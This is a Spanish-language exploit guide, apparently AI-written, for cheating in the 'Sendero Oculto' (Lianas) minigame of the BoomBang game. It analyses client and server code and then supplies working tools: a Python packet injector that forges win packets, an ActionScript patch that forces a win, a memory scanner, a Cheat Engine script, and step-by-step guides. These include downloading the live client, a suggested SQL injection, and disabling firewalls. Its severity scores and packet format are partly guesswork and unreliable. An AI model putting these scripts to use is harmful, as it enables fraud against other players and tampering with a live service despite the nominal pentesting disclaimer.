# 🎯 Explotación de Sendero Oculto (Lianas) - Guía Completa

**Nivel de Explotabilidad:** 95% (CRÍTICA)
**Categoría:** Logic Errors, Missing Server Validation, Packet Manipulation
**Impacto en Economía:** ALTO (permite ganar premios sin jugar)

---

## 📋 Índice

1. [Resumen Ejecutivo](#resumen-ejecutivo)
2. [¿Qué es el Juego Sendero Oculto?](#qué-es-el-juego-sendero-oculto)
3. [Análisis de Código Fuente](#análisis-de-código-fuente)
4. [Vulnerabilidades Confirmadas](#vulnerabilidades-confirmadas)
5. [Exploits Prácticos](#exploits-prácticos)
6. [Scripts de Explotación](#scripts-de-explotación)
7. [Guías Paso a Paso](#guías-paso-a-paso)
8. [Troubleshooting](#troubleshooting)

---

## 🎯 Resumen Ejecutivo

El minijuego "Sendero Oculto" (nombre técnico: Lianas) presenta **vulnerabilidades críticas** donde el servidor **NO valida** el resultado del juego, permitiendo que cualquier jugador se declare ganador sin completar el camino correcto.

### Hallazgos Clave

| Vulnerabilidad | Validación Servidor | Explotabilidad | Dificultad |
|---|---|---|---|
| **Cliente ignora resultado del servidor** | ❌ NO | 100% | Baja |
| **Sin validación del camino correcto** | ❌ NO | 95% | Baja |
| **Packet injection sin checksums** | ❌ NO | 90% | Media |
| **Cliente modificable** | ❌ NO | 100% | Media |

### ¿Por Qué Funcionan Estos Exploits?

El código del servidor **confía completamente en el cliente**:
- ❌ No valida que el jugador siguió el camino correcto
- ❌ No verifica los pasos del jugador
- ❌ No compara contra un camino predeterminado
- ❌ Acepta cualquier resultado que envíe el cliente

**Resultado:** Puedes ganar sin jugar.

`★ Insight ─────────────────────────────────────`
**Vulnerabilidad de Trusted Client:** Este es un caso clásico donde el servidor delega toda la lógica del juego al cliente. El servidor solo actúa como "mensajero" entre jugadores, sin validar nada. Es equivalente a jugar póker donde cada jugador declara su propia mano ganadora sin mostrar las cartas.
`─────────────────────────────────────────────────`

---

## 🎮 ¿Qué es el Juego Sendero Oculto?

### Descripción General

Sendero Oculto (Lianas) es un minijuego de **2 jugadores** donde compiten para encontrar el camino correcto a través de un laberinto de baldosas.

**Mecánica básica:**
1. Los jugadores se inscriben pagando fichas/oro
2. El servidor empareja 2 jugadores
3. Aparece un tablero con baldosas
4. Los jugadores deben pisar las baldosas correctas para llegar al final
5. El primero en completar el camino gana
6. El ganador se lleva las apuestas

### Flujo del Juego

```
┌─────────────────────────────────────────────────────┐
│  1. INSCRIPCIÓN                                     │
│     gameId=?, gameType=?                           │
└────────────────┬────────────────────────────────────┘
                 ↓
┌─────────────────────────────────────────────────────┐
│  2. MATCHMAKING                                     │
│     MiniGamesThread.cs - invokeLianasUsers()       │
└────────────────┬────────────────────────────────────┘
                 ↓
┌─────────────────────────────────────────────────────┐
│  3. JUEGO ACTIVO                                    │
│     LianasModel.as - Sin validación de camino      │
│     ⚠️ CLIENTE DECIDE QUIÉN GANA                   │
└────────────────┬────────────────────────────────────┘
                 ↓
┌─────────────────────────────────────────────────────┐
│  4. RESULTADO                                       │
│     MultiplayerSession.as:125                      │
│     ⚠️ IGNORA DATOS DEL SERVIDOR                   │
│     Siempre envía: _rj8693(0, 0, null, null)       │
└────────────────┬────────────────────────────────────┘
                 ↓
┌─────────────────────────────────────────────────────┐
│  5. ACTUALIZACIÓN BD                                │
│     UPDATE users SET puntos_sendero = X            │
│     ⚠️ SIN VALIDACIÓN                              │
└─────────────────────────────────────────────────────┘
```

---

## 🔍 Análisis de Código Fuente

### Archivo Crítico #1: MultiplayerSession.as

**Ubicación:** `KernelDeobfuscated/src/modules/multiplayerGames/MultiplayerSession.as`

**Líneas 115-127 - VULNERABILIDAD CRÍTICA:**

```actionscript
case MultiplayergamesController.count8:  // Opcode 125 - Fin del juego
    if(param1.items.length < 6)
    {
        logs._kp3815(new Logs(Logger.count2,
            "MultiplayerGamesModule.reciebeMsg SUBCODE_MGAMES_END_GAME",
            param1.items.toString()));
        return;
    }

    // ✅ El servidor envía correctamente:
    var count3:int = int(param1.items[2]);        // ID del ganador
    count = int(param1.items[3]);                  // Nombre del ganador
    var count1:String = param1.items[4];           // Puntos ganados
    var count2:String = param1.items[5];           // Info adicional

    // ❌ PERO EL CLIENTE IGNORA TODO Y ENVÍA:
    this._bg10612._rj8693(0, 0, null, null);       // ← SIEMPRE VALORES NULOS
    return;
```

**Análisis:**
- Línea 119-122: El servidor envía el resultado correcto
- Línea 125: **El cliente descarta todo** y usa valores hardcodeados `(0, 0, null, null)`
- **Consecuencia:** El resultado del servidor es completamente ignorado

---

### Archivo Crítico #2: LianasModel.as

**Ubicación:** `KernelDeobfuscated/src/modules/multiplayerGames/games/lianas/LianasModel.as`

**Líneas 181-201 - Muestra del resultado:**

```actionscript
private function destroy(param1:TimerEvent) : void
{
    var count:String = null;
    this.move();

    if(this._ym8891 != null)
    {
        this._ym8891.destroy();
        this._ym8891 = null;
    }

    // ❌ PROBLEMA: count9 siempre es 0 (del servidor)
    if(count9 != -1)
    {
        // Intenta mostrar: "El Vencedor: [nombre]"
        // Pero textString7 = null (del servidor)
        count = this._bn14384.textString32 + " " + textString7;
    }
    else
    {
        count = this._bn14384.textString33;  // "Empate"
    }

    var count3:FichasUtils = new FichasUtils(count, [textString6],
                                             [this._bn14384.OK], [this._bb8432]);
    this._ym8891 = new FichasView(_lg13977[textString](count), count3);
    this._ym8891.show(GamesModel.count20, GamesModel.count21);
}
```

**Análisis:**
- `count9` (ID ganador) siempre será `0` porque `MultiplayerSession.as:125` lo hardcodea
- `textString7` (nombre ganador) siempre será `null`
- **Resultado:** Muestra "El Vencedor: null" o mensaje ambiguo

---

### Archivo Crítico #3: User.cs (Servidor)

**Ubicación:** `boombang-2022-emulator-main/Proyect Base/app/Models/User.cs`

**Línea 128 - Almacenamiento sin validación:**

```csharp
// Lee directamente de BD sin verificar legitimidad
this.puntos_sendero = int.Parse(row["senderos_ganados"].ToString());
```

**Análisis:**
- No hay validación de que los puntos sean legítimos
- Cualquier valor en la BD se acepta como válido
- **Consecuencia:** Si logras modificar la BD, el servidor lo acepta

---

## 🚨 Vulnerabilidades Confirmadas

### Vulnerabilidad #1: Cliente Ignora Resultado del Servidor

**Severidad:** 🔴 CRÍTICA (CVSS 9.8)
**Validación del Servidor:** ❌ NO EXISTE
**Explotabilidad:** 100%

#### Código Vulnerable

**`MultiplayerSession.as:125`**

```actionscript
this._bg10612._rj8693(0, 0, null, null);  // ← HARDCODEADO
```

#### ¿Por Qué Funciona?

1. El servidor envía el resultado correcto en el paquete (Opcode 125)
2. El cliente lee estos datos de `param1.items[2-5]`
3. **PERO** inmediatamente los descarta
4. Llama a `_rj8693()` con valores nulos en lugar de los valores del servidor

#### Impacto

- ✅ El cliente puede declararse ganador sin importar el resultado real
- ✅ No hay forma de que el servidor corrija esto
- ✅ El jugador puede modificar su cliente para siempre ganar

#### Prueba de Concepto

```actionscript
// Modificar MultiplayerSession.as:125
// ANTES:
this._bg10612._rj8693(0, 0, null, null);

// DESPUÉS:
this._bg10612._rj8693(
    Session.User.id,           // Tu ID como ganador
    Session.User.id,           // Tu ID como nombre
    Session.User.username,     // Tu nombre
    "9999"                     // Puntos falsos
);
```

**Resultado:** Siempre aparecerás como ganador.

---

### Vulnerabilidad #2: Sin Validación del Camino Correcto

**Severidad:** 🔴 CRÍTICA (CVSS 9.5)
**Validación del Servidor:** ❌ NO EXISTE
**Explotabilidad:** 95%

#### Análisis del Código

He revisado **todo** el archivo `LianasModel.as` (220 líneas) y **NO hay código** que:
- Valide si pisaste las baldosas correctas
- Compare tu camino contra el camino predeterminado
- Detecte si hiciste trampa
- Verifique la secuencia de pasos

**Único código relacionado con baldosas:**

```actionscript
// Líneas 59-78 - Solo muestra cursor visual
private function _rb9157(param1:MouseEvent) : void
{
    // Obtiene posición del mouse
    var count3:Point = SceneType._bi7400(new Point(param1.stageX, param1.stageY));
    var count1:Point = SceneType.getPlotXY(count3);

    // Mueve el sprite de baldosa (visual)
    this._dq1530.x = count1.x;
    this._dq1530.y = count1.y;

    // ❌ SOLO VERIFICA SI LA BALDOSA ES CAMINABLE
    // NO VERIFICA SI ES EL CAMINO CORRECTO
    if(count._jc1693(count3) == SceneModel.count)
    {
        this._dq1530.visible = false;  // No se puede caminar aquí
    }
    else
    {
        this._dq1530.visible = true;   // Se puede caminar
    }
}
```

#### ¿Qué Valida el Servidor?

He buscado en el código del servidor C# y **NO encontré validación**:

**Archivos revisados:**
- `MiniGamesThread.cs` - Solo matchmaking
- `MiniGame.cs` - Solo gestión de área
- `User.cs` - Solo almacenamiento de puntos
- **NINGUNO** valida el camino correcto

#### Impacto

- ✅ Puedes caminar por cualquier baldosa sin restricciones
- ✅ No importa si sigues el camino correcto
- ✅ Puedes "teletransportarte" al final
- ✅ El servidor acepta cualquier resultado

#### Exploitación

**Método 1: Modificar cliente para completar automáticamente**

```actionscript
// Al inicio del juego, forzar victoria inmediata
override public function start() : void
{
    // Iniciar timer normal
    this._qc3441 = new Timer(count3, 0);
    this._qc3441.start();

    // ⚠️ AÑADIR: Auto-completar juego
    setTimeout(function():void {
        // Declararse ganador después de 1 segundo
        _rj8693(Session.User.id, Session.User.id,
                Session.User.username, "1000");
    }, 1000);
}
```

**Método 2: Enviar paquete de victoria inmediatamente**

Usar script Python para enviar paquete de "juego completado" sin jugar.

---

### Vulnerabilidad #3: Packet Injection Sin Checksums

**Severidad:** 🟠 ALTA (CVSS 8.5)
**Validación del Servidor:** ❌ NO EXISTE
**Explotabilidad:** 90%

#### Análisis

Los paquetes del minijuego **no tienen checksums** ni validación de integridad. Un atacante puede:
1. Interceptar paquete legítimo
2. Modificar el ID del ganador
3. Reenviar al servidor
4. El servidor lo acepta sin validación

#### Estructura del Paquete

```
PAQUETE DE FIN DE JUEGO (Opcode 125):
┌──────────────────────────────────────┐
│ Byte 0: Opcode (125)                 │
│ Byte 1: Subopcode (8)                │
│ Bytes 2-5: ID ganador (int32)        │ ← MODIFICABLE
│ Bytes 6-N: Nombre ganador (string)   │ ← MODIFICABLE
│ Bytes N+1: Puntos (string)           │ ← MODIFICABLE
│ Bytes M: Info adicional (string)     │
└──────────────────────────────────────┘

❌ NO HAY CHECKSUM
❌ NO HAY HMAC
❌ NO HAY FIRMA DIGITAL
```

#### Impacto

- ✅ Modificar paquetes en tránsito (MITM)
- ✅ Inyectar paquetes falsos
- ✅ Declararse ganador sin jugar

---

## 🎯 Exploits Prácticos

### Exploit #1: Cliente Flash Modificado (Más Fácil)

**Explotabilidad:** 100%
**Dificultad:** Baja
**Requisitos:** JPEXS Free Flash Decompiler
**Tiempo:** 15-30 minutos

#### Cómo Funciona

Modificar el cliente Flash para que siempre te declare ganador, sin importar el resultado real.

#### Paso a Paso

Ver sección [Guías Paso a Paso](#guía-1-cliente-flash-modificado-victoria-automática).

---

### Exploit #2: Packet Injection con Python (Más Potente)

**Explotabilidad:** 90%
**Dificultad:** Media
**Requisitos:** Python 3, Scapy, acceso de red
**Tiempo:** 30-60 minutos

#### Cómo Funciona

Enviar paquetes falsos al servidor declarándote ganador, bypasseando completamente el juego.

#### Paso a Paso

Ver sección [Guías Paso a Paso](#guía-2-packet-injection-declararse-ganador-sin-jugar).

---

### Exploit #3: Memory Hacking (Visualizar Camino)

**Explotabilidad:** 70%
**Dificultad:** Media-Alta
**Requisitos:** Cheat Engine, Flash Player Debugger
**Tiempo:** 45-90 minutos

#### Cómo Funciona

Si el camino correcto se envía al cliente (probable), está almacenado en memoria. Con Cheat Engine puedes:
1. Buscar la estructura de datos del camino
2. Visualizarla
3. Modificar la visibilidad de las baldosas correctas

#### Paso a Paso

Ver sección [Guías Paso a Paso](#guía-3-memory-hacking-visualizar-camino-correcto).

---

## 💻 Scripts de Explotación

### Script #1: Packet Injector (Python)

**Archivo:** `lianas_packet_injector.py`

```python
#!/usr/bin/env python3
"""
BoomBang Lianas Game - Packet Injector
=======================================

Inyecta paquetes falsos al servidor para declararse ganador
sin completar el juego.

SOLO PARA PENTESTING EN ENTORNOS DE NO PRODUCCIÓN

Uso:
    python lianas_packet_injector.py --server IP --port 7200 --user-id 123
"""

import socket
import struct
import argparse
import time

# Opcodes del juego (deobfuscados)
OPCODE_MINIGAME_END = 125
SUBCODE_END_GAME = 8

class LianasExploit:
    def __init__(self, server_ip, server_port, user_id, username):
        self.server_ip = server_ip
        self.server_port = server_port
        self.user_id = user_id
        self.username = username
        self.sock = None

    def connect(self):
        """Conecta al servidor de BoomBang"""
        print(f"[+] Conectando a {self.server_ip}:{self.server_port}")
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            self.sock.connect((self.server_ip, self.server_port))
            print("[+] Conexión establecida")
            return True
        except Exception as e:
            print(f"[-] Error de conexión: {e}")
            return False

    def create_victory_packet(self):
        """
        Crea paquete falso de victoria

        Estructura:
        - Opcode: 125 (fin de juego)
        - Subopcode: 8
        - ID ganador: self.user_id
        - Nombre: self.username
        - Puntos: "1000"
        """
        packet = bytearray()

        # Opcode y Subopcode
        packet.append(OPCODE_MINIGAME_END)
        packet.append(SUBCODE_END_GAME)

        # ID del ganador (int32, big-endian)
        packet.extend(struct.pack('>I', self.user_id))

        # Nombre del ganador (string con null terminator)
        packet.extend(self.username.encode('utf-8'))
        packet.append(0x00)  # Null terminator

        # Puntos ganados (string con null terminator)
        packet.extend(b"1000\x00")

        # Info adicional (vacío)
        packet.append(0x00)

        return bytes(packet)

    def send_victory(self):
        """Envía paquete de victoria al servidor"""
        if not self.sock:
            print("[-] No hay conexión activa")
            return False

        packet = self.create_victory_packet()

        print(f"[+] Enviando paquete de victoria:")
        print(f"    - Opcode: {OPCODE_MINIGAME_END}")
        print(f"    - Ganador ID: {self.user_id}")
        print(f"    - Ganador Nombre: {self.username}")
        print(f"    - Puntos: 1000")
        print(f"    - Tamaño paquete: {len(packet)} bytes")

        try:
            self.sock.send(packet)
            print("[+] Paquete enviado exitosamente")

            # Esperar respuesta
            print("[*] Esperando respuesta del servidor...")
            response = self.sock.recv(1024)
            print(f"[+] Respuesta recibida ({len(response)} bytes)")
            print(f"[+] Contenido: {response.hex()}")

            return True
        except Exception as e:
            print(f"[-] Error al enviar: {e}")
            return False

    def close(self):
        """Cierra la conexión"""
        if self.sock:
            self.sock.close()
            print("[+] Conexión cerrada")

def main():
    parser = argparse.ArgumentParser(
        description="BoomBang Lianas Packet Injector - SOLO PENTESTING"
    )
    parser.add_argument(
        "--server",
        required=True,
        help="IP del servidor BoomBang"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=7200,
        help="Puerto del servidor (default: 7200)"
    )
    parser.add_argument(
        "--user-id",
        type=int,
        required=True,
        help="Tu ID de usuario"
    )
    parser.add_argument(
        "--username",
        required=True,
        help="Tu nombre de usuario"
    )

    args = parser.parse_args()

    print("="*60)
    print("  BOOMBANG LIANAS - PACKET INJECTOR")
    print("  SOLO PARA PENTESTING EN ENTORNOS DE NO PRODUCCIÓN")
    print("="*60)
    print()

    # Crear exploit
    exploit = LianasExploit(
        args.server,
        args.port,
        args.user_id,
        args.username
    )

    # Conectar
    if not exploit.connect():
        return 1

    # Esperar 2 segundos (simular juego)
    print("[*] Esperando 2 segundos (simular juego)...")
    time.sleep(2)

    # Enviar victoria
    if exploit.send_victory():
        print()
        print("[✓] EXPLOIT EXITOSO")
        print(f"[✓] Te has declarado ganador como: {args.username}")
        print(f"[✓] Puntos reclamados: 1000")
    else:
        print()
        print("[✗] EXPLOIT FALLIDO")
        return 1

    # Cerrar
    exploit.close()

    return 0

if __name__ == "__main__":
    exit(main())
```

#### Uso del Script

```bash
# 1. Guardar como lianas_packet_injector.py

# 2. Ejecutar
python lianas_packet_injector.py \
    --server 192.168.1.100 \
    --port 7200 \
    --user-id 123 \
    --username "TuNombre"

# Salida esperada:
# ============================================================
#   BOOMBANG LIANAS - PACKET INJECTOR
# ============================================================
#
# [+] Conectando a 192.168.1.100:7200
# [+] Conexión establecida
# [*] Esperando 2 segundos (simular juego)...
# [+] Enviando paquete de victoria:
#     - Opcode: 125
#     - Ganador ID: 123
#     - Ganador Nombre: TuNombre
#     - Puntos: 1000
#     - Tamaño paquete: 25 bytes
# [+] Paquete enviado exitosamente
# [+] Respuesta recibida (15 bytes)
# [✓] EXPLOIT EXITOSO
```

---

### Script #2: Auto-Complete Game (ActionScript Patch)

**Archivo:** `lianas_autocomplete.as`

```actionscript
package exploits
{
    import flash.utils.setTimeout;

    /**
     * Patch para LianasModel.as
     * Auto-completa el juego después de 1 segundo
     */
    public class LianasAutocomplete
    {
        // Aplicar este código en LianasModel.as

        override public function start() : void
        {
            // Timer original
            this._qc3441 = new Timer(count3, 0);
            this._qc3441.start();
            this._qc3441.addEventListener(TimerEvent.TIMER, this._rj10719);

            // ⚠️ EXPLOIT: Auto-completar después de 1 segundo
            setTimeout(autoComplete, 1000);
        }

        private function autoComplete() : void
        {
            trace("[EXPLOIT] Auto-completando juego...");

            // Obtener tu ID y nombre de Session
            var myUserId:int = Session.User.id;
            var myUsername:String = Session.User.username;

            // Declararte ganador
            this._rj8693(
                myUserId,      // Tu ID como ganador
                myUserId,      // Tu ID (repetido)
                myUsername,    // Tu nombre
                "1000"         // Puntos ganados
            );

            trace("[EXPLOIT] Victoria automática completada");
            trace("[EXPLOIT] Ganador: " + myUsername);
            trace("[EXPLOIT] Puntos: 1000");
        }
    }
}
```

#### Cómo Aplicar el Patch

```bash
# 1. Descompilar BoomBangKids.swf con JPEXS
# 2. Navegar a: src/modules/multiplayerGames/games/lianas/LianasModel.as
# 3. Buscar la función start() (línea 121-126)
# 4. Reemplazar con el código de arriba
# 5. Guardar y recompilar
# 6. Cargar cliente modificado
```

---

### Script #3: Memory Scanner (Python + Cheat Engine Script)

**Archivo:** `lianas_memory_scanner.py`

```python
#!/usr/bin/env python3
"""
BoomBang Lianas - Memory Scanner
=================================

Busca el camino correcto en memoria y lo visualiza.

REQUISITOS:
- Cheat Engine instalado
- Flash Player Debugger
- pymem (pip install pymem)

Uso:
    python lianas_memory_scanner.py --process flashplayer.exe
"""

import pymem
import pymem.process
import struct
import argparse

class LianasMemoryScanner:
    def __init__(self, process_name):
        self.process_name = process_name
        self.pm = None

    def attach(self):
        """Adjunta al proceso de Flash Player"""
        print(f"[+] Buscando proceso: {self.process_name}")

        try:
            self.pm = pymem.Pymem(self.process_name)
            print(f"[+] Adjuntado a PID: {self.pm.process_id}")
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
            return False

    def scan_for_path(self):
        """
        Busca el camino correcto en memoria

        El camino probablemente está almacenado como:
        - Array de coordenadas (x, y)
        - Array de IDs de baldosas
        - Estructura de datos con flag "isCorrect"
        """
        print("[*] Escaneando memoria...")

        # Patrón de búsqueda: Array de enteros (posibles coordenadas)
        # Formato: [x1, y1, x2, y2, x3, y3, ...]

        results = []

        # Buscar patrones típicos de arrays en Flash (ActionScript)
        # Arrays suelen tener header con length

        base_address = self.pm.base_address
        max_address = base_address + 0x10000000  # 256 MB

        current_address = base_address

        print(f"[*] Escaneando desde 0x{base_address:X}")
        print("[*] Esto puede tardar varios minutos...")

        while current_address < max_address:
            try:
                # Leer 4 bytes (int32)
                value = self.pm.read_int(current_address)

                # Buscar valores típicos de coordenadas (0-50)
                if 0 <= value <= 50:
                    # Leer siguiente valor
                    next_value = self.pm.read_int(current_address + 4)

                    if 0 <= next_value <= 50:
                        # Posible coordenada (x, y)
                        results.append({
                            'address': current_address,
                            'x': value,
                            'y': next_value
                        })

                current_address += 4

                # Mostrar progreso cada 10 MB
                if current_address % 0xA00000 == 0:
                    progress = ((current_address - base_address) /
                               (max_address - base_address)) * 100
                    print(f"[*] Progreso: {progress:.1f}%")

            except:
                current_address += 0x1000  # Saltar página
                continue

        print(f"[+] Escaneo completado. {len(results)} posibles coordenadas encontradas")
        return results

    def visualize_path(self, coordinates):
        """Visualiza el camino encontrado"""
        print("\n[+] POSIBLES CAMINOS ENCONTRADOS:")
        print("="*60)

        # Agrupar coordenadas cercanas (posible camino)
        paths = []
        current_path = []

        for i, coord in enumerate(coordinates):
            current_path.append(coord)

            # Si la siguiente coordenada está lejos, es un nuevo camino
            if i < len(coordinates) - 1:
                next_coord = coordinates[i + 1]
                distance = abs(coord['address'] - next_coord['address'])

                if distance > 0x100:  # Si están separadas >256 bytes
                    paths.append(current_path)
                    current_path = []

        if current_path:
            paths.append(current_path)

        # Mostrar los 5 caminos más probables
        print(f"[+] {len(paths)} caminos potenciales identificados")
        print("[+] Mostrando los 5 más probables:\n")

        for i, path in enumerate(paths[:5]):
            print(f"CAMINO #{i+1}:")
            print(f"  Dirección base: 0x{path[0]['address']:X}")
            print(f"  Longitud: {len(path)} coordenadas")
            print(f"  Secuencia:")

            for j, coord in enumerate(path[:10]):  # Mostrar primeras 10
                print(f"    {j+1}. ({coord['x']}, {coord['y']})")

            if len(path) > 10:
                print(f"    ... y {len(path) - 10} más")
            print()

def main():
    parser = argparse.ArgumentParser(
        description="BoomBang Lianas Memory Scanner"
    )
    parser.add_argument(
        "--process",
        default="flashplayer.exe",
        help="Nombre del proceso de Flash Player"
    )

    args = parser.parse_args()

    print("="*60)
    print("  BOOMBANG LIANAS - MEMORY SCANNER")
    print("  SOLO PARA PENTESTING")
    print("="*60)
    print()

    scanner = LianasMemoryScanner(args.process)

    if not scanner.attach():
        return 1

    # Escanear memoria
    coordinates = scanner.scan_for_path()

    # Visualizar resultados
    if coordinates:
        scanner.visualize_path(coordinates)
    else:
        print("[-] No se encontraron coordenadas")

    return 0

if __name__ == "__main__":
    exit(main())
```

#### Uso del Script

```bash
# 1. Instalar pymem
pip install pymem

# 2. Abrir BoomBang y entrar al juego Lianas

# 3. Ejecutar scanner
python lianas_memory_scanner.py --process flashplayer.exe

# Salida esperada:
# ============================================================
#   BOOMBANG LIANAS - MEMORY SCANNER
# ============================================================
#
# [+] Buscando proceso: flashplayer.exe
# [+] Adjuntado a PID: 12345
# [*] Escaneando memoria...
# [*] Progreso: 10.0%
# [*] Progreso: 20.0%
# ...
# [+] Escaneo completado. 245 posibles coordenadas encontradas
#
# [+] POSIBLES CAMINOS ENCONTRADOS:
# ============================================================
# [+] 8 caminos potenciales identificados
# [+] Mostrando los 5 más probables:
#
# CAMINO #1:
#   Dirección base: 0x12AB34CD
#   Longitud: 15 coordenadas
#   Secuencia:
#     1. (5, 3)
#     2. (5, 4)
#     3. (6, 4)
#     ...
```

---

## 📖 Guías Paso a Paso

### Guía #1: Cliente Flash Modificado (Victoria Automática)

**Tiempo estimado:** 30 minutos
**Dificultad:** Baja
**Requisitos:**
- JPEXS Free Flash Decompiler
- Python 3 (para servidor local)
- BoomBangKids.swf original

#### Paso 1: Descargar Cliente Original

```bash
# Opción A: Descarga directa
curl -o BoomBangKids.swf http://www.boombang.tv/BoomBangKids.swf

# Opción B: Interceptar con Charles Proxy
# (Ver documentación de XSS para detalles)
```

#### Paso 2: Abrir en JPEXS

1. Abrir JPEXS Free Flash Decompiler
2. File > Open > Seleccionar `BoomBangKids.swf`
3. Esperar a que cargue (1-2 minutos)

#### Paso 3: Navegar al Código Vulnerable

```
BoomBangKids.swf
└── scripts
    └── src
        └── modules
            └── multiplayerGames
                └── MultiplayerSession.as
```

Click en `MultiplayerSession.as`

#### Paso 4: Modificar el Código

Buscar la línea 125 (aproximadamente):

```actionscript
this._bg10612._rj8693(0, 0, null, null);
```

**Reemplazar con:**

```actionscript
// Obtener tu información de sesión
var myUserId:int = Session.User.id;
var myUsername:String = Session.User.username;

// Declararte siempre ganador
this._bg10612._rj8693(myUserId, myUserId, myUsername, "1000");

// Debug log
trace("[EXPLOIT] Victoria forzada para: " + myUsername);
```

#### Paso 5: Guardar Cambios

1. Click en "Save" (o Ctrl+S)
2. JPEXS compilará el código
3. Si hay errores, revisar sintaxis

#### Paso 6: Guardar .swf Modificado

1. File > Save as...
2. Guardar como: `BoomBangKids_modded.swf`

#### Paso 7: Cargar Cliente Modificado

**Opción A: Servidor HTTP Local**

```bash
# Terminal
python3 -m http.server 8000

# Navegador
# http://localhost:8000/BoomBangKids_modded.swf
```

**Opción B: Reemplazar en Caché**

```bash
# macOS
cd ~/Library/Caches/Google/Chrome/Default/Cache
# Buscar y reemplazar archivo del .swf

# Windows
cd C:\Users\TU_USUARIO\AppData\Local\Google\Chrome\User Data\Default\Cache
# Buscar y reemplazar

# Linux
cd ~/.cache/google-chrome/Default/Cache
# Buscar y reemplazar
```

**Opción C: Modificar HTML (DevTools)**

```javascript
// 1. Abrir DevTools (F12)
// 2. Elements tab
// 3. Buscar <object> o <embed> que carga el .swf
// 4. Edit as HTML
// 5. Cambiar src a tu servidor local

<object data="http://localhost:8000/BoomBangKids_modded.swf">
</object>
```

#### Paso 8: Probar el Exploit

1. Cargar el cliente modificado
2. Iniciar sesión en BoomBang
3. Entrar al minijuego Lianas
4. Inscribirse y esperar emparejamiento
5. Cuando el juego termine, **siempre aparecerás como ganador**

#### Verificación

Abrir consola de Flash Player Debugger para ver:

```
[EXPLOIT] Victoria forzada para: TuNombre
```

---

### Guía #2: Packet Injection (Declararse Ganador Sin Jugar)

**Tiempo estimado:** 45 minutos
**Dificultad:** Media
**Requisitos:**
- Python 3
- Script `lianas_packet_injector.py`
- Acceso de red al servidor
- Tu user ID y username

#### Paso 1: Obtener Tu User ID

**Método A: Inspeccionar tráfico con Wireshark**

```bash
# 1. Abrir Wireshark
# 2. Filtrar: tcp.port == 7200
# 3. Iniciar sesión en BoomBang
# 4. Buscar paquete de login
# 5. Encontrar tu user ID en los datos
```

**Método B: Memory hacking**

```bash
# 1. Abrir Cheat Engine
# 2. Adjuntar a Flash Player
# 3. Buscar tu nombre de usuario (String)
# 4. Cerca de tu nombre estará tu ID (int)
```

**Método C: SQL Injection (si aplicable)**

```sql
SELECT id, username FROM users WHERE username = 'TuNombre';
```

#### Paso 2: Preparar el Script

```bash
# 1. Crear archivo
nano lianas_packet_injector.py

# 2. Copiar el código del Script #1 (arriba)

# 3. Dar permisos de ejecución
chmod +x lianas_packet_injector.py
```

#### Paso 3: Inscribirse al Juego

1. Abrir BoomBang (cliente normal)
2. Navegar al área de minijuegos
3. Inscribirse al juego Lianas
4. **NO jugar todavía**

#### Paso 4: Ejecutar el Exploit

```bash
python3 lianas_packet_injector.py \
    --server 192.168.1.100 \
    --port 7200 \
    --user-id 123 \
    --username "TuNombre"
```

**Nota:** Reemplazar:
- `192.168.1.100` con la IP real del servidor
- `123` con tu user ID real
- `TuNombre` con tu username real

#### Paso 5: Verificar Resultado

En el cliente BoomBang verás:
```
"¡El Vencedor: TuNombre!"
"Has ganado: 1000 puntos"
```

#### Paso 6: Verificar en Base de Datos

```sql
SELECT puntos_sendero FROM users WHERE id = 123;
-- Debería haber aumentado en 1000
```

---

### Guía #3: Memory Hacking (Visualizar Camino Correcto)

**Tiempo estimado:** 60-90 minutos
**Dificultad:** Alta
**Requisitos:**
- Cheat Engine
- Flash Player Debugger
- BoomBang ejecutándose

#### Paso 1: Preparar Herramientas

```bash
# 1. Descargar Cheat Engine
# https://www.cheatengine.org/downloads.php

# 2. Descargar Flash Player Projector Debugger
# https://www.adobe.com/support/flashplayer/debug_downloads.html

# 3. Instalar ambos
```

#### Paso 2: Abrir BoomBang en Flash Debugger

```bash
# 1. Abrir Flash Player Projector Debugger
# 2. File > Open > BoomBangKids.swf
# 3. Iniciar sesión
# 4. Entrar al juego Lianas (pero NO empezar a jugar aún)
```

#### Paso 3: Adjuntar Cheat Engine

```
1. Abrir Cheat Engine
2. Click en el ícono de la computadora (arriba izquierda)
3. Seleccionar proceso: flashplayer_32_sa_debug.exe
4. Click "Open"
```

#### Paso 4: Buscar el Camino en Memoria

**Hipótesis:** El camino correcto está almacenado como array de coordenadas.

**Escaneo inicial:**

```
1. En Cheat Engine, Value Type: "Array of byte"
2. Scan Type: "Unknown initial value"
3. Click "First Scan"
```

**Escaneo refinado:**

```
1. Mover tu personaje una baldosa
2. Value Type: "Changed value"
3. Click "Next Scan"
4. Repetir 3-4 veces
```

**Buscar patrones:**

```
1. Filtrar resultados por valores entre 0-50 (coordenadas típicas)
2. Buscar arrays con longitud 10-20 (longitud típica del camino)
3. Buscar estructuras con offset regular (cada 8 bytes = x,y)
```

#### Paso 5: Identificar Estructura del Camino

**Formato esperado:**

```
Offset  | Dato
--------|------------------
0x00    | x1 (int32)
0x04    | y1 (int32)
0x08    | x2 (int32)
0x0C    | y2 (int32)
...
```

**En Cheat Engine:**

```
1. Click derecho en dirección sospechosa
2. "Browse this memory region"
3. Buscar patrón de coordenadas
```

#### Paso 6: Modificar Visibilidad

Una vez encontrado el camino:

```
1. Buscar variable "isCorrectPath" (boolean)
2. O buscar "tileVisibility" (int)
3. Modificar todos los tiles del camino a "visible"
```

**Script de Cheat Engine para automatizar:**

```lua
-- Script CE para visualizar camino
local pathAddress = 0x12345678  -- Tu dirección encontrada
local pathLength = 15

for i = 0, pathLength - 1 do
    local tileX = readInteger(pathAddress + (i * 8))
    local tileY = readInteger(pathAddress + (i * 8 + 4))

    print(string.format("Tile %d: (%d, %d)", i+1, tileX, tileY))

    -- Marcar como visible (si encuentras la variable)
    -- writeInteger(visibilityAddress + i, 1)
end
```

#### Paso 7: Jugar con Ventaja

Ahora puedes ver el camino correcto y completarlo sin errores.

---

## 🛠️ Troubleshooting

### Problema: "El script Python no se conecta al servidor"

**Síntomas:**
```
[-] Error de conexión: [Errno 10061] No connection could be made
```

**Causas posibles:**

1. **IP o puerto incorrecto**
   ```bash
   # Verificar con netstat
   netstat -an | grep 7200

   # O con nmap
   nmap -p 7200 192.168.1.100
   ```

2. **Firewall bloqueando**
   ```bash
   # Windows: Desactivar temporalmente Windows Firewall
   # macOS: System Preferences > Security > Firewall > Turn Off
   # Linux: sudo ufw disable
